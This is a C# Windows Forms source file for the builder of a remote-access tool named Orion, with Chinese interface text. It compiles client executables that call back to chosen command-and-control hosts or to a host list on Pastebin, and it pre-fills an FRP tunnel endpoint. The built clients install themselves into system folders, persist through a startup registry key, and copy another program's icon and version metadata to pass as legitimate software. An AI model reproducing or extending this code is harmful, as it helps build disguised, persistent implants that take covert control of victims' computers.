using Orion.Common.DNS;
using Orion.Common.Helpers;
using Orion.Server.Build;
using Orion.Server.Enums;
using Orion.Server.Forms.DarkMode;
using Orion.Server.Models;
using Orion.Server.Utilities;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Orion.Server.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private readonly BindingList<Host> _hosts = new BindingList<Host>();

        private readonly HostsConverter _hostsConverter = new HostsConverter();
        private Label lblPortNotification;
        private System.Windows.Forms.Timer portNotificationTimer;
        private System.Windows.Forms.Timer portSetDelayTimer;
        private string pendingHostText;

        public FrmBuilder()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ApplyHighDpiImages();

            txtHost.TextChanged += txtHost_TextChanged;
            txtHost.KeyDown += TxtHost_KeyDown;
            txtIconPath.TextChanged += TxtIconPath_TextChanged;

            lblPortNotification = new Label();
            lblPortNotification.AutoSize = true;
            lblPortNotification.ForeColor = Color.Lime;
            lblPortNotification.Text = "已自动设置端口!";
            lblPortNotification.Visible = false;
            lblPortNotification.Location = new Point(btnAddHost.Location.X + 145, btnAddHost.Location.Y + btnAddHost.Height + 5);
            this.Controls.Add(lblPortNotification);

            portNotificationTimer = new System.Windows.Forms.Timer();
            portNotificationTimer.Interval = 3000;
            portNotificationTimer.Tick += (s, e) =>
            {
                lblPortNotification.Visible = false;
                portNotificationTimer.Stop();
            };

            portSetDelayTimer = new System.Windows.Forms.Timer();
            portSetDelayTimer.Interval = 1000;
            portSetDelayTimer.Tick += PortSetDelayTimer_Tick;

            checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
        }

        private void ApplyHighDpiImages()
        {
            float scale = DpiImageScaling.GetScaleFactor(this);

            // 右键菜单图标（与主界面同一套 DPI 算法）。
            DpiImageScaling.ApplyToToolStrip(contextMenuStrip, scale);

            // UAC 盾牌小图标（原图 16px）按 DPI 缩放。
            DpiImageScaling.ApplyToIconPictureBox(picUAC1, scale);
            DpiImageScaling.ApplyToIconPictureBox(picUAC2, scale);
        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdatePastebinUI();
        }

        private void UpdatePastebinUI()
        {
            txtHost.Enabled = !checkBox1.Checked;
            numericUpDownPort.Enabled = !checkBox1.Checked;
            btnAddHost.Enabled = !checkBox1.Checked;
            lstHosts.Enabled = !checkBox1.Checked;

            txtPastebin.Enabled = checkBox1.Checked;
        }

        private bool IsValidHostPortFormat(string text)
        {
            string[] protocolPrefixes = { "http://", "https://", "ftp://", "sftp://" };
            if (protocolPrefixes.Any(p => text.Trim().StartsWith(p, StringComparison.OrdinalIgnoreCase)))
            {
                return false;
            }

            string[] parts = text.Split(':');
            return parts.Length == 2 &&
                   !string.IsNullOrWhiteSpace(parts[0]) &&
                   ushort.TryParse(parts[1].Trim(), out _);
        }

        private void PortSetDelayTimer_Tick(object sender, EventArgs e)
        {
            portSetDelayTimer.Stop();

            if (pendingHostText != null && IsValidHostPortFormat(pendingHostText))
            {
                string[] parts = pendingHostText.Split(':');
                if (parts.Length == 2)
                {
                    string portStr = parts[1].Trim();
                    txtHost.TextChanged -= txtHost_TextChanged;

                    txtHost.Text = parts[0];

                    if (ushort.TryParse(portStr, out ushort port))
                    {
                        try
                        {
                            numericUpDownPort.Value = port;

                            lblPortNotification.Visible = true;
                            if (portNotificationTimer.Enabled)
                            {
                                portNotificationTimer.Stop();
                            }
                            portNotificationTimer.Start();
                        }
                        catch (ArgumentOutOfRangeException)
                        {
                            // Silently handle out of range port
                        }
                    }

                    txtHost.TextChanged += txtHost_TextChanged;
                }
            }

            pendingHostText = null;
        }

        private void txtHost_TextChanged(object sender, EventArgs e)
        {
            string text = txtHost.Text;
            if (text.Contains(":"))
            {
                pendingHostText = text;

                if (portSetDelayTimer.Enabled)
                {
                    portSetDelayTimer.Stop();
                }
                portSetDelayTimer.Start();
            }
        }

        private void TxtHost_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.V)
            {
                if (portSetDelayTimer.Enabled)
                {
                    portSetDelayTimer.Stop();
                }

                string clipboardText = Clipboard.GetText();

                if (clipboardText.Contains(":"))
                {
                    // Check if the clipboard text is a valid host:port format
                    if (IsValidHostPortFormat(clipboardText))
                    {
                        e.SuppressKeyPress = true;
                        e.Handled = true;

                        string[] parts = clipboardText.Split(':');
                        if (ushort.TryParse(parts[1], out ushort port))
                        {
                            txtHost.Text = parts[0];
                            numericUpDownPort.Value = port;

                            lblPortNotification.Visible = true;
                            if (portNotificationTimer.Enabled)
                            {
                                portNotificationTimer.Stop();
                            }
                            portNotificationTimer.Start();
                        }
                    }
                }
            }
        }

        private void LoadProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            _hosts.Clear();
            foreach (var host in _hostsConverter.RawHostsToList(profile.Hosts, true))
                _hosts.Add(host);

            txtTag.Text = profile.Tag;
            numericUpDownDelay.Value = profile.Delay;
            txtMutex.Text = profile.Mutex;
            chkInstall.Checked = profile.InstallClient;
            txtInstallName.Text = profile.InstallName;
            GetInstallPath(profile.InstallPath).Checked = true;
            txtInstallSubDirectory.Text = profile.InstallSub;
            chkStartup.Checked = profile.AddStartup;
            txtRegistryKeyName.Text = profile.RegistryName;
            chkChangeIcon.Checked = profile.ChangeIcon;
            txtIconPath.Text = profile.IconPath;
            LoadIconPreview(profile.IconPath);
            chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
            txtProductName.Text = profile.ProductName;
            txtDescription.Text = profile.Description;
            txtCompanyName.Text = profile.CompanyName;
            txtCopyright.Text = profile.Copyright;
            txtTrademarks.Text = profile.Trademarks;
            txtOriginalFilename.Text = profile.OriginalFilename;
            txtProductVersion.Text = profile.ProductVersion;
            txtFileVersion.Text = profile.FileVersion;
            txtPastebin.Text = profile.Pastebin;
            checkBox1.Checked = profile.EnablePastebin;

            // 默认 64 位。仅当用户【主动】选过 32 位时才回落到 x86 —— 老 profile 里的
            // targetArchitecture=0 只是历史默认（当年界面默认就是 32 位），不代表用户意愿，
            // 因此用 ArchExplicitlySet 区分，保证改成 64 位默认后老配置也能一次性迁移。
            bool useX64 = !profile.ArchExplicitlySet || profile.TargetArchitecture == (byte)TargetArchitecture.X64;
            rbX64.Checked = useX64;
            rbX86.Checked = !useX64;

            _profileLoaded = true;
        }

        private void SaveProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            profile.Tag = txtTag.Text;
            profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
            profile.Delay = (int)numericUpDownDelay.Value;
            profile.Mutex = txtMutex.Text;
            profile.Pastebin = txtPastebin.Text;
            profile.EnablePastebin = checkBox1.Checked;
            profile.InstallClient = chkInstall.Checked;
            profile.InstallName = txtInstallName.Text;
            profile.InstallPath = GetInstallPath();
            profile.InstallSub = txtInstallSubDirectory.Text;
            profile.AddStartup = chkStartup.Checked;
            profile.RegistryName = txtRegistryKeyName.Text;
            profile.ChangeIcon = chkChangeIcon.Checked;
            profile.IconPath = txtIconPath.Text;
            profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            profile.ProductName = txtProductName.Text;
            profile.Description = txtDescription.Text;
            profile.CompanyName = txtCompanyName.Text;
            profile.Copyright = txtCopyright.Text;
            profile.Trademarks = txtTrademarks.Text;
            profile.OriginalFilename = txtOriginalFilename.Text;
            profile.ProductVersion = txtProductVersion.Text;
            profile.FileVersion = txtFileVersion.Text;

            profile.TargetArchitecture = rbX64.Checked ? (byte)TargetArchitecture.X64 : (byte)TargetArchitecture.X86;
            // 一旦用户在此界面保存过，之后就固定尊重该选择，不再被默认值迁移覆盖
            profile.ArchExplicitlySet = true;
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            lstHosts.DataSource = new BindingSource(_hosts, null);
            LoadProfile("Default");

            numericUpDownPort.Value = Settings.ListenPort;

            // C2 架构：若启用了 FRP 隧道，被控端应直连 FRPS 的公网暴露端口(remote_port)，
            // 这里自动把连接目标预填为 <server_addr>:<remote_port> 并加入列表，新手可直接构建。
            if (Models.Settings.FrpEnabled &&
                Orion.Server.Frp.FrpTunnelManager.Instance.TryGetConnectionTarget(out string frpAddr, out int frpRemotePort) &&
                !string.IsNullOrWhiteSpace(frpAddr) && frpRemotePort > 0)
            {
                txtHost.Text = frpAddr;
                numericUpDownPort.Value = frpRemotePort;

                bool already = _hosts.Any(h => h.Hostname == frpAddr && h.Port == frpRemotePort);
                if (!already)
                {
                    _hosts.Add(new Host
                    {
                        Hostname = frpAddr,
                        Port = (ushort)frpRemotePort
                    });
                }
            }

            lblPortNotification.BringToFront();

            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
            UpdatePastebinUI();


        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show(this, "是否保存当前设置?", "检测到更改",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1) return;

            HasChanged();

            var host = txtHost.Text;
            ushort port = (ushort)numericUpDownPort.Value;

            _hosts.Add(new Host { Hostname = host, Port = port });
            txtHost.Text = "";
        }

        #region "Context Menu"
        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in lstHosts.SelectedItems select arr.ToString()).ToList();

            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }
        #endregion

        #region "Misc"
        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateAssemblyControlStates();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择图标";
                ofd.Filter = "图标文件 (*.ico)|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    LoadIconPreview(ofd.FileName);
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateIconControlStates();
        }
        #endregion

        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
                 _hosts.Count > 0 && // Connection
                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallName.Text))) && // Installation
                 (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
        }

        private BuildOptions GetBuildOptions()
        {
            BuildOptions options = new BuildOptions();
            if (!CheckForEmptyInput() && !checkBox1.Checked)
            {
                throw new Exception("请填写所有必填字段!");
            }

            options.Tag = txtTag.Text;
            options.Mutex = txtMutex.Text;
            if (checkBox1.Checked)
            {
                options.RawHosts = txtPastebin.Text;
                options.Pastebin = true;

                // Validate the pastebin URL
                if (string.IsNullOrWhiteSpace(options.RawHosts) ||
                    (!options.RawHosts.StartsWith("http://") && !options.RawHosts.StartsWith("https://")))
                {
                    throw new Exception("请输入有效的 Pastebin URL，应以 http:// 或 https:// 开头");
                }
            }
            else
            {
                options.Pastebin = false;
                options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);

                if (options.RawHosts.Length < 2)
                {
                    throw new Exception("请输入有效的主机地址以供连接。");
                }
            }

            options.Delay = (int)numericUpDownDelay.Value;
            options.IconPath = txtIconPath.Text;
            options.Version = ServerVersion.Current;
            options.InstallPath = GetInstallPath();
            options.InstallSub = txtInstallSubDirectory.Text;
            options.InstallName = txtInstallName.Text + ".exe";
            options.StartupName = txtRegistryKeyName.Text;
            options.Install = chkInstall.Checked;
            options.Startup = chkStartup.Checked;
            options.TargetArchitecture = rbX64.Checked ? TargetArchitecture.X64 : TargetArchitecture.X86;

            if (!File.Exists("client.bin"))
            {
                throw new Exception("找不到 \"client.bin\" 文件，它应与 Orion 在同一目录下。");
            }

            if (chkChangeIcon.Checked)
            {
                if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                {
                    throw new Exception("请选择有效的图标路径。");
                }
            }
            else
                options.IconPath = string.Empty;

            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text))
                {
                    throw new Exception("请输入有效的产品版本号!\n示例: 1.2.3.4");
                }

                if (!IsValidVersionNumber(txtFileVersion.Text))
                {
                    throw new Exception("请输入有效的文件版本号!\n示例: 1.2.3.4");
                }

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = txtOriginalFilename.Text;
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "保存客户端为";
                sfd.Filter = "可执行文件 (*.exe)|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "Orion-Client.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    throw new Exception("请选择有效的输出路径。");
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                throw new Exception("请选择有效的输出路径。");
            }

            return options;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            BuildOptions options;
            try
            {
                options = GetBuildOptions();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "构建失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SetBuildState(false);

            Thread t = new Thread(BuildClient);
            t.Start(options);
        }

        private void SetBuildState(bool state)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnBuild.Text = (state) ? "构建" : "构建中...";
                    btnBuild.Enabled = state;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void BuildClient(object o)
        {
            BuildOptions options = (BuildOptions)o;

            // 输出文件可能正被占用（典型场景：上一次构建的客户端还在运行）。
            // 这种情况下给用户一次「结束占用进程后重试」的机会，而不是直接甩一堆栈跟踪。
            for (int attempt = 0; ; attempt++)
            {
                try
                {
                    var builder = new ClientBuilder(options, "client.bin");

                    var code = builder.Build();

                    if (!(code))
                    {
                        ShowBuildSuccess($"客户端构建成功! 已保存至:\\{options.OutputPath}");
                    }

                    break;
                }
                catch (Exception ex)
                {
                    if (attempt == 0 && TryReleaseAndRetry(options.OutputPath, ex))
                        continue;   // 已结束占用进程，重新构建覆盖

                    ShowBuildError(ex);
                    break;
                }
            }

            SetBuildState(true);
        }

        private void ShowBuildSuccess(string message)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    MessageBox.Show(this, message, "构建成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                });
            }
            catch (Exception)
            {
            }
        }

        private void ShowBuildError(Exception ex)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    MessageBox.Show(this,
                        $"发生错误!\n\n错误信息: {ex.Message}\n堆栈跟踪:\n{ex.StackTrace}", "构建失败",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                });
            }
            catch (Exception)
            {
            }
        }

        private void ShowWarning(string message, string title)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    MessageBox.Show(this, message, title, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                });
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// 写输出文件时发现文件被别的进程占用时的处理：询问用户是否结束占用进程，
        /// 用户确认后杀掉它们并等待句柄释放。
        /// </summary>
        /// <returns>true = 已释放，调用方应重新构建；false = 放弃，走正常报错流程。</returns>
        private bool TryReleaseAndRetry(string outputPath, Exception error)
        {
            if (string.IsNullOrWhiteSpace(outputPath)) return false;

            // 仅 I/O 类错误才可能是占用；再用 IsLocked 二次确认，避免把"路径非法"等
            // 无关错误也误判成占用（否则会去杀无辜进程）。
            if (!FileLockHelper.IsFileLockError(error)) return false;
            if (!FileLockHelper.IsLocked(outputPath)) return false;

            var lockers = FileLockHelper.FindLockingProcesses(outputPath);
            if (lockers.Count == 0) return false;

            bool release = false;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    var list = string.Join("\n", lockers.ConvertAll(l => "  • " + l));
                    release = MessageBox.Show(this,
                        $"无法写入输出文件：\n{outputPath}\n\n占用该文件的进程：\n{list}\n\n" +
                        "该进程被占用，是否尝试释放该文件？\n（确定后将结束上述进程，并重新构建覆盖。）",
                        "文件被占用", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK;
                });
            }
            catch (InvalidOperationException)
            {
                return false;   // 窗体已关闭
            }

            if (!release) return false;

            string failed;
            if (!FileLockHelper.TryKillAll(lockers, out failed))
            {
                ShowWarning($"无法结束占用进程：\n{failed}\n\n请手动关闭后重新构建。", "释放失败");
                return false;
            }

            // 杀掉进程后句柄释放有延迟，等文件真正可写再重试（最多 5 秒）
            FileLockHelper.WaitUntilUnlocked(outputPath, 5000);
            return true;
        }

        private void RefreshPreviewPath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallSubDirectory.Text), txtInstallName.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), txtInstallSubDirectory.Text), txtInstallName.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallSubDirectory.Text), txtInstallName.Text);

            this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+(\.[0-9]+)?(\.[0-9]+)?$", RegexOptions.IgnoreCase);
            return match.Success;
        }

        private short GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            throw new ArgumentException("InstallPath");
        }

        private RadioButton GetInstallPath(short installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }

        private void UpdateAssemblyControlStates()
        {
            txtProductName.Enabled = chkChangeAsmInfo.Checked;
            txtDescription.Enabled = chkChangeAsmInfo.Checked;
            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
        }
        private void UpdateIconControlStates()
        {
            txtIconPath.Enabled = chkChangeIcon.Checked;
            btnBrowseIcon.Enabled = chkChangeIcon.Checked;

            // Clear icon preview when disabled
            if (!chkChangeIcon.Checked)
            {
                iconPreview.Image?.Dispose();
                iconPreview.Image = null;
            }
            else
            {
                // Load preview if path exists when enabled
                LoadIconPreview(txtIconPath.Text);
            }
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void UpdateInstallationControlStates()
        {
            txtInstallName.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallSubDirectory.Enabled = chkInstall.Checked;
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        /// <summary>
        /// Handles a basic change in setting.
        /// </summary>
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        /// <summary>
        /// Handles a basic change in setting, also refreshing the example file path.
        /// </summary>
        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshPreviewPath();
        }

        private void txtHost_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void builderTabs_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void connectionPage_Click(object sender, EventArgs e)
        {

        }

        private void txtPastebin_TextChanged(object sender, EventArgs e)
        {

        }

        private void btnClone_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择要克隆设置的可执行文件";
                ofd.Filter = "可执行文件 (*.exe)|*.exe";
                ofd.Multiselect = false;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(ofd.FileName);

                        txtProductName.Text = versionInfo.ProductName ?? "";
                        txtDescription.Text = versionInfo.FileDescription ?? "";
                        txtCompanyName.Text = versionInfo.CompanyName ?? "";
                        txtCopyright.Text = versionInfo.LegalCopyright ?? "";
                        txtTrademarks.Text = versionInfo.LegalTrademarks ?? "";
                        txtOriginalFilename.Text = versionInfo.OriginalFilename ?? "";

                        string productVer = versionInfo.ProductVersion ?? "1.0.0.0";
                        string fileVer = versionInfo.FileVersion ?? "1.0.0.0";

                        txtProductVersion.Text = CleanVersionNumber(productVer);
                        txtFileVersion.Text = CleanVersionNumber(fileVer);

                        chkChangeAsmInfo.Checked = true;

                        try
                        {
                            string tempIconPath = Path.Combine(Path.GetTempPath(), $"{Path.GetFileNameWithoutExtension(ofd.FileName)}_{Guid.NewGuid()}.ico");
                            Icon iconextracted = Icon.ExtractAssociatedIcon(ofd.FileName);

                            Bitmap bitmap = iconextracted.ToBitmap();

                            SaveBitmapAsIcon(bitmap, tempIconPath);

                            txtIconPath.Text = tempIconPath;
                            LoadIconPreview(tempIconPath);

                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"无法提取图标: {ex.Message}", "图标提取错误",
                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }

                        MessageBox.Show($"已成功从 {Path.GetFileName(ofd.FileName)} 克隆设置",
                            "克隆完成", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        HasChanged();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"克隆设置时出错: {ex.Message}", "克隆失败",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private string CleanVersionNumber(string version)
        {
            string cleaned = string.Join(".", version.Split('.', ' ')
                .Where(s => !string.IsNullOrWhiteSpace(s) && s.Any(char.IsDigit))
                .Select(s => string.Join("", s.Where(char.IsDigit))));

            string[] parts = cleaned.Split('.');
            if (parts.Length == 0)
                return "1.0";
            else if (parts.Length == 1)
                return parts[0] + ".0";

            return cleaned;
        }

        // THIS IS MADE BY CHATGPT BECAUSE WHY TF DOES .NET NOT HAVE ICONS KEEP THEIR TRANSPARENCY WHEN SAVING THEM AS .ICO FILES?!
        // YOU NEED TO CONVERT IT TO A BITMAP TO PRESERVE THE ALPHA CHANNEL THEN CONVERT THAT BMP BACK TO AN ICO :sob:
        public static void SaveBitmapAsIcon(Bitmap bitmap, string filename)
        {
            using (var fs = new FileStream(filename, FileMode.Create))
            {
                // Write ICONDIR structure
                fs.Write(new byte[] {
                0, 0,   // Reserved
                1, 0,   // Type: 1 = icon
                1, 0    // Count: 1 image
            }, 0, 6);

                // ICONDIR structure: width, height, colors, reserved, planes, bitcount, size, offset
                byte width = (byte)(bitmap.Width >= 256 ? 0 : bitmap.Width); // 0 means 256
                byte height = (byte)(bitmap.Height >= 256 ? 0 : bitmap.Height); // 0 means 256

                using (var imageStream = new MemoryStream())
                {
                    // Save bitmap as PNG inside the .ico (modern format with alpha)
                    bitmap.Save(imageStream, System.Drawing.Imaging.ImageFormat.Png);
                    byte[] pngData = imageStream.ToArray();

                    fs.Write(new byte[] {
                    width,
                    height,
                    0,        // Color count
                    0,        // Reserved
                    1, 0,     // Color planes
                    32, 0     // Bits per pixel
                }, 0, 8);

                    fs.Write(BitConverter.GetBytes(pngData.Length), 0, 4);  // Size of image data
                    fs.Write(BitConverter.GetBytes(22), 0, 4);              // Offset of image data

                    fs.Write(pngData, 0, pngData.Length);                   // Write PNG data
                }
            }
        }

        /// <summary>
        /// Loads and displays an icon preview with proper transparency handling
        /// </summary>
        /// <param name="iconPath">Path to the icon file</param>
        private void LoadIconPreview(string iconPath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(iconPath) || !File.Exists(iconPath))
                {
                    iconPreview.Image?.Dispose();
                    iconPreview.Image = null;
                    return;
                }

                iconPreview.Image?.Dispose();

                using (Icon icon = new Icon(iconPath, new Size(64, 64)))
                {
                    iconPreview.Image = icon.ToBitmap();
                }
            }
            catch (Exception ex)
            {
                iconPreview.Image?.Dispose();
                iconPreview.Image = null;
                Debug.WriteLine($"Error loading icon preview: {ex.Message}");
            }
        }

        private void TxtIconPath_TextChanged(object sender, EventArgs e)
        {
            LoadIconPreview(txtIconPath.Text);
            HasChanged();
        }

        private void generalPage_Click(object sender, EventArgs e)
        {

        }
    }
}
